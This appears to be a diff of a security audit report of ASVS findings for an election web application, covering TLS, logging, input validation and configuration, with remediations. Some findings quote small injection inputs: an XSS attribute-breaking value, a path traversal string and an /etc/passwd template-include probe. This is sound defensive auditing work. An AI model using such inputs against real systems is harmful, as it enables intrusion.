-Document that TLS must be configured on the application even when behind a proxy (unless on the same localhost). Or enforce TLS between proxy and backend by requiring certfile and keyfile in production configuration: server: port: 58383, certfile: internal-service.pem (Required even behind proxy), keyfile: internal-service-key.pem
-
----
-
-#### FINDING-272: No Mutual TLS (mTLS) or Strong Service Authentication for Internal Communications
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L3 |
-| CWE | - |
-| ASVS Section(s) | 12.3.5 |
-| Affected File(s) | v3/ARCHITECTURE.md, v3/server/main.py |
-| Source Report(s) | 12.3.5.md |
-| Related Finding(s) | - | **Description:**
-
-The architecture is primarily a monolithic application (Quart web server + SQLite file database) with minimal service-to-service communication. However, there are identifiable communication paths: 1. Reverse proxy → Application server: No mutual TLS; the proxy authenticates to the backend only via network connectivity (no client certificate) 2. Application → OAuth provider (oauth.apache.org): Standard TLS, no client certificate authentication 3. Application → LDAP server: Authentication via bind credentials in bind.txt, no evidence of mTLS. The system does not implement: TLS client certificate authentication, Service mesh, API keys or tokens for service-to-service authentication, or Replay attack prevention for internal calls. At Level 3, the absence of mutual TLS means internal services cannot cryptographically verify each other's identity. An attacker with network access could potentially impersonate internal services. However, given the monolithic architecture with SQLite (no network database), the attack surface is limited.
-
-**Remediation:**
-
-For a Level 3 deployment, add mTLS support in main.py by creating an SSL context with client certificate authentication enabled. Load server certificate chain and internal CA certificate, set verify_mode to ssl.CERT_REQUIRED to require client certificates, and apply this context when running the app. Alternatively, consider implementing a service mesh (e.g., Istio, Linkerd) if the architecture evolves to microservices.
-
----
-
-#### FINDING-273: Vote Type Enumeration Not Documented Outside of Code
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L1 |
-| CWE | - |
-| ASVS Section(s) | 2.1.1 |
-| Affected File(s) | v3/docs/schema.md |
-| Source Report(s) | 2.1.1.md |
-| Related Finding(s) | - | **Description:**
-
-The schema documentation mentions yna and stv as vote types but does not document the complete set of valid values, how they are validated, or their expected input/output formats. The schema.md states: type (TEXT, NOT NULL): The voting mechanism. Currently supports: yna: Yes/No/Abstain voting, stv: Single Transferable Vote. Additional types may be added in the future. The enumeration exists partially in documentation and is enforced in code (vtypes.TYPES), but the validation rules for each type's vote data are not documented.
-
-**Remediation:**
-
-Document the expected vote input format for each type and the validation rules that apply.
-
----
-
-#### FINDING-274: Election Creation Has No Secondary Approval
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L3 |
-| CWE | - |
-| ASVS Section(s) | 2.3.5 |
-| Affected File(s) | v3/server/pages.py:410 |
-| Source Report(s) | 2.3.5.md |
-| Related Finding(s) | - | **Description:**
-
-While creation itself is not destructive, it's the entry point for the entire election lifecycle. A PMC member could create elections without organizational awareness. This is lower severity as elections must still be opened and closed, and the R.pmc_member requirement provides some gatekeeping.
-
-**Remediation:**
-
-Consider implementing a secondary approval workflow for election creation to ensure organizational awareness and oversight, particularly for high-impact elections.
-
----
-
-#### FINDING-275: Vote Table Schema Lacks Timestamp for Timing Analysis
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L3 |
-| CWE | - |
-| ASVS Section(s) | 2.4.2 |
-| Affected File(s) | v3/schema.sql:148-168 |
-| Source Report(s) | 2.4.2.md |
-| Related Finding(s) | - | **Description:**
-
-The vote table schema lacks a created_at timestamp column, preventing timing-based analysis or enforcement at the database level. This means the application cannot retroactively detect automated voting patterns, cannot implement minimum interval checks at the database level, and audit capabilities are limited.
-
-**Remediation:**
-
-Add a created_at INTEGER column with DEFAULT (strftime('%s', 'now')) to the vote table and implement a database trigger prevent_rapid_revote to enforce minimum time intervals between votes at the database level.
-
----
-
-#### FINDING-276: Regex Applied to User-Controlled Content Without Input Length Limit
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L3 |
-| CWE | - |
-| ASVS Section(s) | 1.3.12 |
-| Affected File(s) | v3/server/pages.py:56-62 |
-| Source Report(s) | 1.3.12.md |
-| Related Finding(s) | - | **Description:**
-
-The rewrite_description() function applies a regex pattern r'doc:([^\s]+)' to issue.description content without a documented length limit on the description field. While the regex itself is not vulnerable to ReDoS (it uses a simple non-overlapping character class with linear O(n) complexity and no nested quantifiers or ambiguous matching), an extremely long description (megabytes) could cause momentary CPU usage during the linear scan. This is a standard DoS concern rather than exponential backtracking. The description field is admin-provided content (election managers create issues via do_add_issue_endpoint() and do_edit_issue_endpoint()), not arbitrary external users.
-
-**Remediation:**
-
-Implement maximum length constraints on description and title fields in do_add_issue_endpoint() and do_edit_issue_endpoint() to prevent resource exhaustion. As the application grows, consider integrating a static analysis tool (e.g., regexploit) into CI/CD to catch ReDoS-vulnerable patterns in new code.
-
----
-
-#### FINDING-277: Election title used in flash messages and logs without length restriction
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS Section(s) | 1.3.3 |
-| Affected File(s) | v3/server/pages.py:476-479 |
-| Source Report(s) | 1.3.3.md |
-| Related Finding(s) | - | **Description:**
-
-The election creation endpoint accepts form.title without length validation and uses it in logs and flash messages. No length validation on form.title allows arbitrarily long strings to be stored and rendered. While not directly exploitable for code injection (SQL is parameterized), extremely long values could cause display issues or log flooding.
-
-**Remediation:**
-
-Add input length validation with a reasonable maximum (e.g., 200 characters): MAX_TITLE_LENGTH = 200; if not form.title or len(form.title) > MAX_TITLE_LENGTH: await flash_danger('Title is required and must be under 200 characters.'); return quart.redirect('/admin', code=303).
-
----
-
-#### FINDING-278: User-controlled data passed to EZT template variables without explicit escaping (mitigated by EZT design)
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS Section(s) | 1.3.7 |
-| Affected File(s) | v3/server/pages.py:243, v3/server/pages.py:666 |
-| Source Report(s) | 1.3.7.md |
-| Related Finding(s) | - | **Description:**
-
-User-controlled data like eid from URL parameters is passed to EZT template variables without explicit escaping. EZT (EaZyTemplate) is a restricted template engine that substitutes variable values as literal strings without re-interpreting template syntax. Unlike Jinja2 or Mako, EZT's [varname] directives do not evaluate expressions—they output the string value directly. Therefore, even if eid contained [include /etc/passwd], EZT would output it as literal text. Template injection is not achievable via EZT variable substitution. However, the lack of explicit HTML escaping means this is an XSS concern rather than a template injection concern.
-
-**Remediation:**
-
-While template injection is mitigated by EZT's design, documenting this architectural decision and ensuring templates are never loaded from user-controlled paths provides defense-in-depth. Ensure all templates are loaded from the TEMPLATES directory only and never construct template content from user input: assert template_path.resolve().is_relative_to(TEMPLATES)
-
----
-
-#### FINDING-279: Unsanitized filenames extracted from issue descriptions in rewrite_description()
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L1 |
-| CWE | CWE-22 |
-| ASVS Section(s) | 5.3.2 |
-| Affected File(s) | v3/server/pages.py:49-56 |
-| Source Report(s) | 5.3.2.md |
-| Related Finding(s) | FINDING-169 | **Description:**
-
-The rewrite_description() function extracts filenames from issue descriptions using a regex pattern 'doc:([^\s]+)' and constructs URL paths without sanitization. While filenames originate from authorized users (committers storing issue descriptions), a malicious committer could craft a description containing path traversal sequences in the doc: pattern. A committer could store an issue description containing 'doc:../../sensitive-file' which generates a link to '/docs/&lt;iid&gt;/../../sensitive-file'. When a voter clicks this link, it would be handled by serve_doc() where framework-level safe_join would prevent traversal, but the link itself could confuse users or be used in social engineering.
-
-**Remediation:**
-
-Validate extracted filenames against a safe pattern (e.g., ^[a-zA-Z0-9][a-zA-Z0-9._-]*$) and HTML-encode output. Replace invalid references with placeholder text like '[invalid doc reference]'. Use markupsafe.escape() for safe HTML rendering.
-
----
-
-#### FINDING-280: Unencoded filenames in HTML output breaking document structure
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS Section(s) | 5.4.2 |
-| Affected File(s) | v3/server/pages.py:49-56 |
-| Source Report(s) | 5.4.2.md |
-| Related Finding(s) | - | **Description:**
-
-The `rewrite_description()` function constructs HTML `<a>` tags with filenames extracted from issue descriptions without HTML encoding. If a filename contains HTML special characters (`"`, `<`, `>`, `&`), it could break the document structure of the rendered page. If an issue description (set by a committer) contains `doc:file"onmouseover="alert(1)`, the resulting HTML would inject event handlers, breaking the HTML attribute context. Exploitation requires a malicious committer.
-
-**Remediation:**
-
-Use `markupsafe.escape()` for display text and `urllib.parse.quote()` for href attributes. Example: `safe_display = escape(filename)` and `safe_href = urllib.parse.quote(filename, safe='')` then construct link as `f'<a href="/docs/{issue.iid}/{safe_href}">{safe_display}</a>'`
-
----
-
-#### FINDING-281: No File Content-Type Validation on Document Serving
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS Section(s) | 5.4.3 |
-| Affected File(s) | v3/server/pages.py:614 |
-| Source Report(s) | 5.4.3.md |
-| Related Finding(s) | - | **Description:**
-
-The send_from_directory function infers MIME type from the file extension without restricting allowed file types. This allows any file type to be served, including HTML files (which could contain JavaScript for XSS) or executable content that could be rendered inline by browsers. Without content type restrictions, a file named exploit.html containing JavaScript could be served with text/html content type, enabling stored XSS attacks against voters who view the document in their browser. Browsers may execute JavaScript or other active content in files served with permissive content types. SVG files could contain embedded JavaScript that executes in the browser context.
-
-**Remediation:**
-
-Force safe content disposition by adding as_attachment=True parameter to send_from_directory to force download rather than inline rendering. Add security headers including X-Content-Type-Options: nosniff to prevent MIME-type sniffing and Content-Security-Policy: default-src 'none' to restrict content execution. Implement a whitelist of allowed file extensions (.pdf, .txt, .md). Consider serving documents from a separate domain to isolate them from the main application context.
-
----
-
-#### FINDING-282: No explicit HTTP method restrictions visible
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L3 |
-| CWE | - |
-| ASVS Section(s) | 4.1.4 |
-| Affected File(s) | v3/server/api.py:1-21 |
-| Source Report(s) | 4.1.4.md |
-| Related Finding(s) | - | **Description:**
-
-The file defines no routes and contains no method restriction configuration. While the `asfquart` framework likely provides method-specific routing (e.g., `@app.route('/path', methods=['GET', 'POST'])`), there is no visible global rejection of unexpected methods (e.g., TRACE, TRACK, DELETE on endpoints that shouldn't support them) nor a catch-all handler to return 405 for undefined methods. If the framework's default behavior allows arbitrary HTTP methods on endpoints (e.g., TRACE for XST attacks, or unexpected method handling), unused methods may be accessible.
-
-**Remediation:**
-
-Add global method restriction or verify Quart/asfquart defaults reject unsupported methods with 405. Example implementation: Add a @APP.before_request handler that checks if request.method is in an allowed set of methods (GET, POST, OPTIONS, HEAD) and returns 405 for others. Ensure TRACE and TRACK methods are blocked at the server level.
-
----
-
-#### FINDING-283: No per-message digital signature mechanism observed
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L3 |
-| CWE | - |
-| ASVS Section(s) | 4.1.5 |
-| Affected File(s) | v3/server/api.py:1-21 |
-| Source Report(s) | 4.1.5.md |
-| Related Finding(s) | - | **Description:**
-
-For a voting application handling highly sensitive transactions (vote casting, election management), there is no visible implementation of per-message digital signatures (e.g., HTTP Message Signatures RFC 9421, JWS, or HMAC-based request signing) that would provide integrity assurance beyond transport-layer TLS. Without per-message signatures, if TLS is terminated at a proxy and internal traffic is unencrypted, or if there are intermediary systems, message integrity cannot be independently verified. For a voting system, this means vote submissions could theoretically be tampered with in transit between internal components.
-
-**Remediation:**
-
-For highly sensitive operations (vote submission, election state changes), implement request signing using HMAC or digital signatures. Example implementation: Add a before_request handler that verifies X-Signature header using HMAC with SHA256, comparing against the request body. Ensure hmac.compare_digest is used for timing-safe comparison. Consider implementing HTTP Message Signatures RFC 9421, JWS, or HMAC-based request signing for vote submissions and election state changes.
-
----
-
-#### FINDING-284: Date/time operations use naive datetimes without timezone awareness
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS Section(s) | 16.2.2 |
-| Affected File(s) | v3/server/pages.py:86, v3/server/pages.py:571, v3/server/bin/tally.py:86, v3/server/pages.py:97 |
-| Source Report(s) | 16.2.2.md |
-| Related Finding(s) | - | **Description:**
-
-All datetime operations use naive (timezone-unaware) datetime objects. While not directly a logging issue, this indicates that the application lacks UTC discipline, making it likely that log timestamps (when configured) would also use local time. Affected operations include datetime.datetime.now().timestamp() at line 571, datetime.datetime.fromtimestamp(election.close_at) at line 86, and datetime.datetime.fromisoformat(date_str) at line 97 in pages.py.
-
-**Remediation:**
-
-Use timezone-aware datetime objects throughout the application. Import from datetime import datetime, timezone and use datetime.now(timezone.utc) and datetime.fromtimestamp(ts, tz=timezone.utc) for all datetime operations.
-
----
-
-#### FINDING-285: Tally script outputs decrypted vote results to stdout without log governance
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS Section(s) | 16.2.3, 16.4.2 |
-| Affected File(s) | v3/server/bin/tally.py:129-135 |
-| Source Report(s) | 16.2.3.md, 16.4.2.md |
-| Related Finding(s) | - | **Description:**
-
-The tally script outputs decrypted election results (including voter identities and vote tallies) directly to stdout. While this is the intended functionality of a CLI tool, it represents sensitive data being output to an undocumented channel. There is no logging of WHERE this output goes or who captures it. Without documentation of how tally outputs should be secured, results could be inadvertently captured in shell history, piped to insecure files, or logged by terminal multiplexers.
-
-**Remediation:**
-
-Add audit logging when results are output: `_LOGGER.info(f'TALLY_OUTPUT election_id={election.eid} format={output_format} issues={len(results)} voters={len(all_voters)}')`. Document in logging inventory that tally output is to stdout and must be handled per data classification policy.
-
----
-
-#### FINDING-286: No request/correlation ID for tracing multi-step operations
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS Section(s) | 16.2.4 |
-| Affected File(s) | v3/server/pages.py:all endpoint handlers |
-| Source Report(s) | 16.2.4.md |
-| Related Finding(s) | - | **Description:**
-
-When a user submits votes for multiple issues in a single request, each vote generates a separate log entry with no shared correlation ID. A log processor cannot determine that these entries belong to the same HTTP request without temporal proximity heuristics. This could complicate forensic investigation of specific voting sessions.
-
-**Remediation:**
-
-Generate request-scoped correlation ID using uuid. Example: import uuid; request_id = str(uuid.uuid4())[:8]; for iid, votestring in votes.items(): _LOGGER.info(f'request_id={request_id} User[U:{result.uid}] voted on issue[I:{iid}] in election[E:{election.eid}]')
-
----
-
-#### FINDING-287: PersonDB Lookup Failure Handling
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS Section(s) | 16.3.4 |
-| Affected File(s) | v3/server/pages.py:303-313 |
-| Source Report(s) | 16.3.4.md |
-| Related Finding(s) | - | **Description:**
-
-When a PersonNotFound exception occurs, the handler returns a 404 but doesn't log this unexpected condition. An authenticated user not found in PersonDB is an anomalous condition that could indicate a configuration issue or data integrity problem.
-
-**Remediation:**
-
-Add structured logging when PersonNotFound exception occurs for an authenticated user. Log the authenticated UID, context, and timestamp as this represents an anomalous security-relevant condition.
-
----
-
-#### FINDING-288: Debug print statements expose form data to process output
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS Section(s) | 16.5.1 |
-| Affected File(s) | v3/server/pages.py:499, v3/server/pages.py:524 |
-| Source Report(s) | 16.5.1.md |
-| Related Finding(s) | - | **Description:**
-
-Debug `print()` statements output raw form data (which could include issue titles, descriptions, and other user-supplied content) to stdout. While not directly returned to other users, if stdout is captured by a process manager or accessible logging system, it could expose data to unauthorized parties. This is stdout output, not response body. However, it indicates development debugging left in production code.
-
-**Remediation:**
-
-Remove debug print statements or replace with appropriate log level: `_LOGGER.debug(f'Form data received for issue creation: keys={list(form.keys())}')`
-
----
-
-#### FINDING-289: SQLite database access lacks authentication mechanism
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2, L3 |
-| CWE | - |
-| ASVS Section(s) | 13.2.1 |
-| Affected File(s) | v3/steve/election.py:35-37, v3/steve/persondb.py:25-26 |
-| Source Report(s) | 13.2.1.md |
-| Related Finding(s) | - | **Description:**
-
-Communications between application components and the SQLite database do not use any authentication mechanism. The database is accessed via file path with no credentials. SQLite is a file-based database and does not natively support user authentication. Access control depends entirely on file system permissions. This is classified as LOW because SQLite's embedded nature means it runs in-process and is not a network service. However, the requirement applies to "data layers" which includes databases. The application relies solely on OS file permissions rather than cryptographic authentication. Data Flow: Application process → file system → steve.db → no authentication layer
-
-**Remediation:**
-
-For SQLite specifically: Document that file system permissions serve as the authentication mechanism; Ensure the database file has restrictive permissions (e.g., 0600, owned by the application service account); Consider SQLite encryption extensions (e.g., SQLCipher) for data-at-rest protection; If migrating to a networked database, implement service account authentication with short-term credentials
-
----
-
-#### FINDING-290: Email service communication lacks documented authentication configuration
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2, L3 |
-| CWE | - |
-| ASVS Section(s) | 13.2.1 |
-| Affected File(s) | v3/server/bin/mail-voters.py:67-73 |
-| Source Report(s) | 13.2.1.md |
-| Related Finding(s) | - | **Description:**
-
-The email sending function does not show explicit SMTP authentication. The comment '# Add other parameters as needed (e.g., auth, headers)' suggests authentication is not yet configured. The asfpy.messaging library may handle this internally, but it is not documented or visible in this codebase. If SMTP authentication is not configured, the application may be relying on network-level trust (e.g., sending from within the same network as the mail relay) which could be spoofed or abused.
-
-**Remediation:**
-
-Document SMTP authentication method and ensure it uses short-term tokens or certificate-based authentication rather than static passwords.
-
----
-
-#### FINDING-291: CLI scripts run without documented privilege requirements
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2, L3 |
-| CWE | - |
-| ASVS Section(s) | 13.2.2 |
-| Affected File(s) | v3/server/bin/create-election.py, v3/server/bin/mail-voters.py |
-| Source Report(s) | 13.2.2.md |
-| Related Finding(s) | - | **Description:**
-
-Command-line utilities that directly modify the database or send emails have no documented OS-level privilege requirements or access controls. Scripts create-election.py (can create elections, add voters) and mail-voters.py (can read voter emails and send messages) have the same database privileges as the web server but no authentication or authorization layer. Anyone with shell access to the server can create elections, modify voter rolls, or send emails to voters without audit trail beyond system-level logging.
-
-**Remediation:**
-
-Document required OS permissions and consider adding authentication checks or restricted execution contexts for CLI tools.
-
----
-
-#### FINDING-292: No connection management parameters (timeouts, retries, max connections) defined in configuration
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L3 |
-| CWE | - |
-| ASVS Section(s) | 13.2.6 |
-| Affected File(s) | v3/server/config.yaml.example:entire file scope |
-| Source Report(s) | 13.2.6.md |
-| Related Finding(s) | - | **Description:**
-
-The configuration schema does not define connection management parameters for any backend service. For the SQLite database (steve.db), connection parameters like busy timeout and journal mode should be configured. For external services (OAuth, LDAP), timeout and retry parameters prevent cascading failures. Without explicit connection configuration: slow external services (OAuth, LDAP) could cause request handler timeouts, connection leaks could exhaust file descriptors, no circuit-breaker behavior when backends are unavailable, and default retry strategies may cause thundering herd problems.
-
-**Remediation:**
-
-Extend config.yaml schema to include connection configuration for backend services:
-
-connections:
-  database:
-    path: steve.db
-    busy_timeout_ms: 5000
-    journal_mode: WAL
-    max_connections: 5
-    
-  oauth:
-    base_url: "https://oauth.apache.org"
-    connect_timeout_s: 5
-    read_timeout_s: 10
-    max_retries: 3
-    retry_backoff: "exponential"
-    max_parallel: 10
-    
-  ldap:
-    host: "ldaps://ldap.apache.org"
-    connect_timeout_s: 5
-    search_timeout_s: 10
-    max_retries: 2
-    pool_size: 5
-    pool_lifetime_s: 300
-    behavior_on_exhaustion: "block"
-
-Implement these parameters in the HTTP client and LDAP connection code. Add application-layer URL validation for outbound requests against a configured allowlist. Implement health checks for backend connectivity.
-
----
-
-#### FINDING-293: No explicit exclusion of source control metadata in deployment configuration
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L1 |
-| CWE | - |
-| ASVS Section(s) | 13.4.1 |
-| Affected File(s) | main.py:49 |
-| Source Report(s) | 13.4.1.md |
-| Related Finding(s) | - | **Description:**
-
-No deployment manifest, Dockerfile, or `.dockerignore` is present in the audited code to explicitly exclude `.git`, `.svn`, or other source control metadata directories from production deployments. The application does set `static_folder=None` in `main.py:create_app()`, which prevents Quart from serving arbitrary files from a static directory. However, there is no explicit deployment configuration ensuring source control metadata is excluded. If a deployment pipeline does not strip `.git` directories and the reverse proxy (mentioned in config.yaml.example comments) does not block access to these paths, source code history, credentials in commits, and internal structure could be exposed.
-
-**Remediation:**
-
-Add explicit deployment artifacts (`.dockerignore`, deployment script, or reverse proxy rules) that exclude `.git` and `.svn` from production:
-
-yaml
-# In a .dockerignore or deployment exclusion list:
-.git
-.svn
-.hg
-*.pyc
-__pycache__
-
-
-Or add reverse proxy rules:
-apache
-# Apache
-&lt;DirectoryMatch "^\.(git|svn|hg)"&gt;
-    Require all denied
-&lt;/DirectoryMatch&gt;
-
----
-
-#### FINDING-294: Documentation and monitoring endpoints cannot be verified due to missing module visibility
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS Section(s) | 13.4.5 |
-| Affected File(s) | v3/server/main.py:52-53 |
-| Source Report(s) | 13.4.5.md |
-| Related Finding(s) | - | **Description:**
-
-The `pages` and `api` modules are imported but their contents are not available for audit. Without visibility into these modules, we cannot verify whether documentation endpoints (e.g., Swagger/OpenAPI), health check endpoints, or monitoring endpoints are exposed without access control. If the `api` module exposes auto-generated documentation (common in frameworks using decorators) or if monitoring/health endpoints exist without authentication, internal API structure and system health information could be disclosed to unauthorized users.
-
-**Remediation:**
-
-Ensure that any documentation or monitoring endpoints in the `pages` and `api` modules are: (1) Protected by authentication/authorization, (2) Disabled in production via configuration, (3) Or only bound to internal network interfaces. Example: conditional endpoint registration using `if not app.cfg.server.get('production', True): import api_docs` to only load docs in non-production.
-
-#### FINDING-295: 🔵 Example configuration reveals development tooling information
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L3 |
-| CWE | - |
-| ASVS Section(s) | 13.4.6 |
-| Files | v3/server/config.yaml.example |
-| Source Reports | 13.4.6.md |
-| Related Findings | - | **Description:**
-
-The example configuration uses specific certificate filenames (`localhost.apache.org+3.pem`) that reveal the use of `mkcert` tool (which generates certificates in this naming format). While this is an example file, if used as a template, it could leak tooling information. Impact is minimal — reveals development tooling choice but no exploitable information.
-
-**Remediation:**
-
-Use generic certificate filenames in example configuration files (e.g., `server.pem`, `server-key.pem`) to avoid revealing development tooling choices.
-
----
-
-#### FINDING-296: 🔵 Sensitive Files Co-Located in Application Directory
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L3 |
-| CWE | - |
-| ASVS Section(s) | 13.4.7 |
-| Files | v3/server/config.yaml.example, v3/server/main.py:27-28, v3/server/main.py:48 |
-| Source Reports | 13.4.7.md |
-| Related Findings | - | **Description:**
-
-The application directory (THIS_DIR) contains or is configured to contain config.yaml (database credentials, server configuration), steve.db (database file), certs/*.pem and certs/*-key.pem (TLS private keys), and *.py (application source code). While static_folder=None prevents serving these via the framework's default handler, the co-location means a single misconfiguration (e.g., accidentally setting static_folder='.') could expose all sensitive files. This is a defense-in-depth violation where a single-point failure in static file configuration could expose credentials, keys, and source code.
-
-**Remediation:**
-
-Store sensitive files outside the application directory. Move database to /var/lib/steve/steve.db and certificates to /etc/ssl/private/steve. Update path resolution in main.py to use separate directories for sensitive data. Add .dockerignore or deployment script that excludes sensitive files from the web-accessible directory.
-
----
-
-#### FINDING-297: 🔵 Database Operations Not Isolated From Web-Serving Process
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L3 |
-| CWE | - |
-| ASVS Section(s) | 15.2.5 |
-| Files | v3/steve/election.py:43 |
-| Source Reports | 15.2.5.md |
-| Related Findings | - | **Description:**
-
-SQLite database access occurs directly in the web-serving process. The database file (containing encrypted votes, salts, and opened_keys) is accessible to the same process that handles untrusted HTTP input. A path traversal or file inclusion vulnerability elsewhere could compromise the database directly.
-
-**Remediation:**
-
-Consider using a dedicated database access layer (microservice or separate process) that mediates all database operations, limiting the web process to API calls rather than direct file access.
-
----
-
-#### FINDING-298: 🔵 Election Owner PID Exposed to Non-Owner Voters
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L1 |
-| CWE | - |
-| ASVS Section(s) | 15.3.1 |
-| Files | v3/server/pages.py:235 |
-| Source Reports | 15.3.1.md |
-| Related Findings | - | **Description:**
-
-In the `vote_on_page()` function in `pages.py`, the `result.election` object passed to the template includes `owner_pid`, `authz`, and other administrative fields that voters do not need. While `get_metadata()` already excludes `salt` and `opened_key`, fields like `authz` (LDAP group) are still exposed. This is low severity as the template likely only renders specific fields, but it violates the principle of returning only the required subset of fields to users.
-
-**Remediation:**
-
-Create a voter-specific view of election metadata that excludes administrative fields like `owner_pid` and `authz`. Implement field-level access control so different users (owner vs voter vs admin) receive different field subsets from the same data objects.
-
----
-
-#### FINDING-299: 🔵 Vote Endpoint Accepts Arbitrary Form Keys with vote- Prefix
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS Section(s) | 15.3.3 |
-| Files | v3/server/pages.py:390 |
-| Source Reports | 15.3.3.md |
-| Related Findings | - | **Description:**
-
-The do_vote_endpoint() function extracts any form key prefixed with 'vote-' and uses the suffix as an issue ID. An attacker could submit arbitrary issue IDs for issues they shouldn't vote on (if issues exist in other elections). However, this is mitigated by downstream validation in add_vote() which calls self.q_get_mayvote.first_row(pid, iid) to check authorization. The risk is limited to triggering errors for non-existent issues within the election.
-
-**Remediation:**
-
-Add validation to ensure extracted issue IDs exist in the current election's issue_dict before processing. Consider adding explicit allowlisting of issue IDs based on the election context to fail fast rather than relying solely on downstream authorization checks.
-
----
-
-#### FINDING-300: 🔵 No Type Validation on Form Fields Before Use
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS Section(s) | 15.3.5 |
-| Files | v3/server/pages.py |
-| Source Reports | 15.3.5.md |
-| Related Findings | - | **Description:**
-
-Functions `do_add_issue_endpoint()`, `do_edit_issue_endpoint()`, and `do_create_endpoint()` use `edict(await quart.request.form)` pattern without explicit type validation. While Quart's form parser naturally returns strings for standard form-encoded data, the conversion to `edict` and direct attribute access without type checking creates potential for unexpected behavior if Content-Type headers are manipulated. Mitigating factor: Quart's request.form parser specifically handles application/x-www-form-urlencoded and multipart/form-data, always returning string values.
-
-**Remediation:**
-
-Replace `edict(await quart.request.form)` pattern with explicit field extraction using `form_data.get('fieldname')` with type checking. Example:
 ```python
-form = await quart.request.form
-title = form.get('title', '')
-if not isinstance(title, str) or not title:
-    quart.abort(400, 'Invalid title')
+CLIENT_ID = app.cfg.oauth.client_id  # From configuration
+
+asfquart.generics.OAUTH_URL_INIT = (
+    'https://oauth.apache.org/auth?client_id=%s&state=%s&redirect_uri=%s'
+    % (CLIENT_ID, '%s', '%s')
+)
+asfquart.generics.OAUTH_URL_CALLBACK = (
+    'https://oauth.apache.org/token?code=%s&client_id=%s&client_secret=%s'
+)
 ```
 
 ---
 
-#### FINDING-301: 🔵 EasyDict Usage with User-Controlled Input May Allow Attribute Injection
+#### FINDING-224: Missing response_mode parameter in OAuth authorization request
 
 | Attribute | Value |
 |-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS Section(s) | 15.3.6 |
-| Files | v3/server/pages.py:401, v3/server/pages.py:447, v3/server/pages.py:518 |
-| Source Reports | 15.3.6.md |
-| Related Findings | - | **Description:**
+| **Severity** | 🔵 Low |
+| **ASVS Level(s)** | L3 |
+| **CWE** | N/A |
+| **ASVS Section(s)** | 10.4.12 |
+| **Affected File(s)** | v3/server/main.py:39-40 |
+| **Source Report(s)** | 10.4.12.md |
+| **Related Finding(s)** | None |
 
-EasyDict converts dictionary keys to object attributes. If user input contains keys like `__class__`, `__init__`, `__dict__`, `items`, `keys`, or other Python dunder/method names, it could shadow built-in methods. In Python, this is significantly less dangerous than JavaScript prototype pollution. The worst case is denial of service via TypeError if internal method names are shadowed. No actual prototype chain modification occurs. However, if a form field named `items` is submitted, EasyDict's __getattr__ resolves to the stored value, potentially causing TypeError when code later calls form.items().
+**Description:**
+
+The OAuth authorization request does not specify a `response_mode` parameter. There is no enforcement that the authorization server will only use the expected response mode (query for code flow). Without PAR or JAR, the authorization server relies on its own configuration to restrict response modes. Without explicit `response_mode` specification, an attacker modifying the authorization request (e.g., through open redirector or parameter injection) could potentially force the authorization server to return tokens in fragment mode, making them accessible to client-side code. This is a Level 3 requirement and lower risk given the code grant type in use.
 
 **Remediation:**
 
-Instead of edict for user input, use explicit field extraction: form_data = await quart.request.form; title = form_data.get('title', '').strip(); description = form_data.get('description', '').strip(). Replace `edict(await quart.request.form)` pattern throughout the application with explicit field extraction with type checking instead of converting entire form data to attribute-accessible objects.
